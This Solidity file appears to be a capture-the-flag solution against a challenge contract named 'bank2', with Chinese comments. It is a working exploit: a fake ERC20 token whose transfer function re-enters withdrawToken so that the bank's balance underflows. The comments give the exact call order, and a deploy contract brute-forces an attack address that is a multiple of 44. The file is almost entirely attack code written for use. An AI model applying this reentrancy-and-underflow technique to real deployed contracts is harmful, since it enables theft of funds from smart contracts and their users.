//SPDX-License-Identifier:UNLICENSE
pragma solidity ^0.7.0;
import "./bank2.sol";
//首先需要符合IERC20like接口，复制一个下来即可。
contract bank2Attack is IERC20 {

    string public constant name = "bank2";
    string public constant symbol = "BK";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;
    address public bank;
    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_ = 20 ether;
    bool public isFallback;

   constructor(address _bank) {
    balances[msg.sender] = totalSupply_/2;
    balances[address(this)] = totalSupply_/2;
    bank = _bank;
    }
    function totalSupply() public override view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address account) public override view returns (uint256) {
        return balances[account];
    }

    function transfer(address receiver, uint256 amount) public override returns (bool) {
        // require(amount <= balances[msg.sender]);
        // balances[msg.sender] = balances[msg.sender]-amount;
        // balances[receiver] = balances[receiver]+amount;
        if(!isFallback){
            isFallback=true;
            bank2(bank).withdrawToken(address(this),amount);
        }
        emit Transfer(msg.sender, receiver, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address sender, address spender) public override view returns (uint) {
        return allowed[sender][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(amount <= balances[sender]);
        
        require(amount <= allowed[sender][msg.sender]);

        balances[sender] = balances[sender]-amount;
        allowed[sender][msg.sender] = allowed[sender][msg.sender]-amount;
        balances[recipient] = balances[recipient]+amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    //按顺序依次调用一下三个函数，需要注意的是transfer函数经过了改动，用来进行了一个
    //简单的重入，即可让余额发生下溢。
    function deposit()public{
        this.approve(bank,10 ether);
        bank2(bank).depositToken(address(this),0.01 ether);
    }
    function withdraw()public{
        bank2(bank).withdrawToken(address(this),0.01 ether);
    }
    function complete()public{
        bank2(bank).getOneToken();
        check(bank).isCompleted(address(this));
    }
}
//用来部署攻击合约，目的是地址成为44的倍数。
contract deploy{
    bank2Attack public attack;
    constructor(address _bank){
        for(uint i =1;i>0;i++){
            attack = new bank2Attack(_bank);
            if(uint160(address(attack))%44==0){
                break;
            }
        }
    }
}
